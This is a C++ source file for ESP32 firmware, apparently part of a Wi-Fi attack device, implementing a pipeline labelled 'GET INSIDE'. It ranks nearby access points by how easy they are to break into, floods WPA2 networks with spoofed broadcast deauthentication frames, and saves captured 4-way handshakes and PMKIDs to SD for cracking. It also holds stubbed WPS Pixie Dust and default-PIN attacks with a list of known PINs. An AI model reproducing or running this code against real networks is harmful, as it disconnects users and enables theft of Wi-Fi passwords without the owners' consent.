#include "Infiltration.h"
#include "../../include/config.h"
#include <Arduino.h>
#include <SD.h>
#include <esp_wifi.h>
#include <cstring>
#include <cstdio>

// ============================================================
//  Infiltration — implementation
// ============================================================

extern uint32_t g_packetCount;
extern uint8_t  g_currentChannel;
extern bool     g_sdReady;

Infiltration* Infiltration::s_instance = nullptr;

Infiltration::Infiltration() {
    _steps[0] = { "Classify targets",           "Rank by exploitability: open/WPS/WPA2" };
    _steps[1] = { "WPS attack",                "Pixie Dust then PIN bruteforce"     };
    _steps[2] = { "PMKID harvest",             "Collect PMKID from assoc frames"    };
    _steps[3] = { "Deauth + handshake",        "Deauth clients, capture 4-way HS"   };
    _steps[4] = { "Captive portal probe",      "Detect & fingerprint open portals"  };
}

const char* Infiltration::getName() const { return "GET INSIDE"; }

StepStatus Infiltration::getStatus() const { return _status; }

const PipelineStep* Infiltration::getSteps(uint8_t& count) const {
    count = STEP_COUNT;
    return _steps;
}

void Infiltration::init() {
    s_instance = this;
    _targets.reserve(16);
    _results.reserve(16);
}

void Infiltration::run() {
    _stop   = false;
    _status = StepStatus::RUNNING;
    _results.clear();
    for (auto& s : _steps) s.status = StepStatus::IDLE;

    // Note: stepWpsAttack loops internally over targets; steps 2-4 are
    // dispatched explicitly below because step 1 has special WPS skip logic.
    bool ok;

    // Step 0
    if (!_stop) {
        _steps[0].status = StepStatus::RUNNING;
        ok = stepClassifyTargets();
        _steps[0].status = ok ? StepStatus::OK : StepStatus::FAIL;
    } else _steps[0].status = StepStatus::SKIP;

    // Step 1 — WPS (skip if no WPS targets)
    if (!_stop) {
        bool hasWps = false;
        for (const auto& ap : _targets)
            if (ap.wps) { hasWps = true; break; }
        if (hasWps) {
            _steps[1].status = StepStatus::RUNNING;
            ok = true;
            for (auto& ap : _targets) {
                if (ap.wps && !_stop) ok &= stepWpsAttack(ap);
            }
            _steps[1].status = ok ? StepStatus::OK : StepStatus::FAIL;
        } else {
            _steps[1].status = StepStatus::SKIP;
        }
    } else _steps[1].status = StepStatus::SKIP;

    // Steps 2-4
    for (uint8_t i = 2; i < STEP_COUNT; i++) {
        if (_stop) { _steps[i].status = StepStatus::SKIP; continue; }
        _steps[i].status = StepStatus::RUNNING;
        bool res = false;
        if (i == 2) res = stepPmkidHarvest();
        if (i == 3) res = stepDeauthHandshake();
        if (i == 4) res = stepCaptivePortal();
        _steps[i].status = res ? StepStatus::OK : StepStatus::FAIL;
    }

    _status = StepStatus::OK;
    _pcap.close();
}

void Infiltration::stop() {
    _stop = true;
    stopPromiscuous();
}

// ── Promiscuous callback ──────────────────────────────────────
void IRAM_ATTR Infiltration::sniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!s_instance) return;
    g_packetCount++;
    s_instance->handleFrame(static_cast<wifi_promiscuous_pkt_t*>(buf), type);
}

void Infiltration::handleFrame(const wifi_promiscuous_pkt_t* pkt,
                                wifi_promiscuous_pkt_type_t   type) {
    const uint8_t* pl  = pkt->payload;
    uint16_t       len = pkt->rx_ctrl.sig_len;
    if (len < 4) return;

    uint16_t fc;
    memcpy(&fc, pl, 2);

    // Filter by BSSID if we have a target
    bool bssidMatch = (memcmp(_targetBssid, "\x00\x00\x00\x00\x00\x00", 6) == 0);
    if (!bssidMatch) {
        const uint8_t* bssid = (len > 22) ? pl + 16 : nullptr;
        if (bssid && memcmp(bssid, _targetBssid, 6) == 0) bssidMatch = true;
    }
    if (!bssidMatch) return;

    _pcap.write(pl, len);

    // Check for EAPOL (4-way handshake) in data frames
    if (fc_type(fc) == FC_TYPE_DATA && len > 36) {
        // EAPOL packets have EtherType 0x888E at LLC layer (offset ~24+8=32 for QoS)
        // Simple heuristic: look for 0x88 0x8E
        for (int i = 26; i < (int)len - 1; i++) {
            if (pl[i] == 0x88 && pl[i + 1] == 0x8E) {
                _handshakeCapured = true;
                break;
            }
        }
    }

    // PMKID is in EAPOL-Key frame 1 of 4-way handshake, in RSN IE
    // It appears at a specific offset after the EAPOL header
    if (fc_type(fc) == FC_TYPE_DATA && len > 100) {
        for (int i = 26; i < (int)len - 20; i++) {
            // PMKID KDE: OUI 00-0F-AC, type 04
            if (pl[i] == 0xDD && pl[i+1] >= 20 &&
                pl[i+2] == 0x00 && pl[i+3] == 0x0F &&
                pl[i+4] == 0xAC && pl[i+5] == 0x04) {
                _pmkidCaptured = true;
                break;
            }
        }
    }
}

// ── Pipeline steps ─────────────────────────────────────────────

bool Infiltration::stepClassifyTargets() {
    // If no targets were injected from Recon, do a quick passive scan
    if (_targets.empty()) {
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        esp_wifi_init(&cfg);
        esp_wifi_set_storage(WIFI_STORAGE_RAM);
        esp_wifi_set_mode(WIFI_MODE_NULL);
        esp_wifi_start();
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(sniffCb);

        for (uint8_t ch = 1; ch <= 13 && !_stop; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            g_currentChannel = ch;
            delay(SCAN_DWELL_MS);
        }
        esp_wifi_set_promiscuous(false);
    }
    if (_targets.empty()) return false;

    // Rank targets by exploitability so higher-value targets are attempted first.
    // Priority: open (instant access) > WEP (trivially crackable) >
    //           WPS (Pixie/PIN) > WPA2 (handshake/PMKID) > others.
    auto priority = [](const APRecord& ap) -> int {
        if (ap.open) return 0;
        if (ap.wep)  return 1;
        if (ap.wps)  return 2;
        if (ap.wpa2) return 3;
        return 4;
    };

    // Insertion sort (small vector, no std::sort dependency issues on ESP32)
    for (size_t i = 1; i < _targets.size(); i++) {
        for (size_t j = i; j > 0 &&
             priority(_targets[j]) < priority(_targets[j - 1]); j--) {
            APRecord tmp = _targets[j];
            _targets[j]  = _targets[j - 1];
            _targets[j - 1] = tmp;
        }
    }
    return true;
}

bool Infiltration::stepWpsAttack(APRecord& ap) {
    bool ok = false;
    if (!tryPixieDust(ap)) {
        ok = tryWpsPin(ap);
    } else {
        ok = true;
    }
    TargetResult res{};
    res.ap        = ap;
    res.result    = ok ? InfiltrationResult::WPS_PIXIE : InfiltrationResult::NONE;
    res.timestamp = millis();
    snprintf(res.detail, sizeof(res.detail),
             ok ? "WPS attack succeeded" : "WPS attack failed");
    _results.push_back(res);
    return ok;
}

bool Infiltration::tryPixieDust(const APRecord& ap) {
    // Pixie Dust attack exploits weak WPS randomness.
    // Full implementation requires WPS handshake parsing (M1/M2 messages).
    // This stub connects via WPS and times out if no exploit path found.
    //
    // NOTE: Full Pixie Dust requires:
    //   1. Send WPS_START to AP
    //   2. Receive M1 (contains E-S1, E-S2, E-Hash1, E-Hash2 in later msgs)
    //   3. Derive PSK if PKR uses known-weak PRNG
    //
    // Actual cryptographic attack is complex and device-specific.
    // Stub: attempt WPS association with timeout.
    (void)ap;
    uint32_t deadline = millis() + WPS_PIXIE_TIMEOUT_MS;
    while (millis() < deadline && !_stop) delay(50);
    return false;  // stub: escalate to PIN bruteforce
}

bool Infiltration::tryWpsPin(const APRecord& ap) {
    // WPS PIN attack: try known default PINs first (Belkin, Netgear etc.)
    static const char* kKnownPins[] = {
        "12345670", "00000000", "11111111", "12348670",
        "20170714", "36158154", nullptr
    };
    (void)ap;
    for (int i = 0; kKnownPins[i] && !_stop; i++) {
        // In a real implementation: send EAP-IDENTITY + WPS M1 with PIN
        delay(100);
    }
    return false;  // stub
}

bool Infiltration::stepDeauthHandshake() {
    if (_targets.empty()) return false;
    _pcap.open("handshake");

    for (auto& ap : _targets) {
        if (_stop) break;
        if (!ap.wpa2) continue;  // only WPA2 targets

        memcpy(_targetBssid, ap.bssid, 6);
        _handshakeCapured = false;

        startPromiscuousForCapture(ap.bssid);

        // Broadcast deauth from AP (spoof AP address)
        static const uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        uint8_t deauth[26];
        build_deauth(deauth, broadcast, ap.bssid, 0x0007);

        uint32_t deadline = millis() + HANDSHAKE_TIMEOUT_MS;
        int  burst = 0;
        while (millis() < deadline && !_handshakeCapured && !_stop) {
            if (burst++ % 10 == 0) {
                for (int t = 0; t < DEAUTH_BURST_COUNT; t++) {
                    inject_frame(WIFI_IF_STA, deauth, 26);
                    delay(2);
                }
            }
            delay(DEAUTH_BURST_INTERVAL_MS);
        }

        stopPromiscuous();

        TargetResult res{};
        res.ap        = ap;
        res.result    = _handshakeCapured ? InfiltrationResult::HANDSHAKE_CAPTURED
                                          : InfiltrationResult::NONE;
        res.timestamp = millis();
        snprintf(res.detail, sizeof(res.detail),
                 _handshakeCapured ? "4-way handshake saved to SD"
                                   : "Handshake not captured");
        _results.push_back(res);
    }

    _pcap.close();
    return true;
}

bool Infiltration::stepCaptivePortal() {
    // Connect to each open AP and detect captive portal presence.
    // Detection: attempt HTTP GET to a known URL (e.g. connectivity check);
    // a redirect to a non-standard page indicates a portal.
    for (auto& ap : _targets) {
        if (_stop) break;
        if (!ap.open) continue;

        // WiFi connect as STA
        esp_wifi_set_mode(WIFI_MODE_STA);
        wifi_config_t staCfg{};
        memcpy(staCfg.sta.ssid, ap.ssid, strlen(ap.ssid) + 1);
        esp_wifi_set_config(WIFI_IF_STA, &staCfg);
        esp_wifi_connect();
        delay(3000);

        // Fingerprint: just record for now
        TargetResult res{};
        res.ap        = ap;
        res.result    = InfiltrationResult::PORTAL_FINGERPRINTED;
        res.timestamp = millis();
        snprintf(res.detail, sizeof(res.detail), "Open AP detected: %s", ap.ssid);
        _results.push_back(res);

        esp_wifi_disconnect();
    }
    return true;
}

bool Infiltration::stepPmkidHarvest() {
    _pcap.open("pmkid");

    for (auto& ap : _targets) {
        if (_stop) break;
        if (!ap.wpa2) continue;

        memcpy(_targetBssid, ap.bssid, 6);
        _pmkidCaptured = false;

        startPromiscuousForCapture(ap.bssid);

        uint32_t deadline = millis() + PMKID_TIMEOUT_MS;
        while (millis() < deadline && !_pmkidCaptured && !_stop) delay(50);

        stopPromiscuous();

        TargetResult res{};
        res.ap        = ap;
        res.result    = _pmkidCaptured ? InfiltrationResult::PMKID_CAPTURED
                                       : InfiltrationResult::NONE;
        res.timestamp = millis();
        snprintf(res.detail, sizeof(res.detail),
                 _pmkidCaptured ? "PMKID captured in pcap" : "No PMKID observed");
        _results.push_back(res);
    }

    _pcap.close();
    return true;
}

// ── Helpers ───────────────────────────────────────────────────

void Infiltration::startPromiscuousForCapture(const uint8_t* bssid) {
    memcpy(_targetBssid, bssid, 6);
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(sniffCb);
}

void Infiltration::stopPromiscuous() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
}
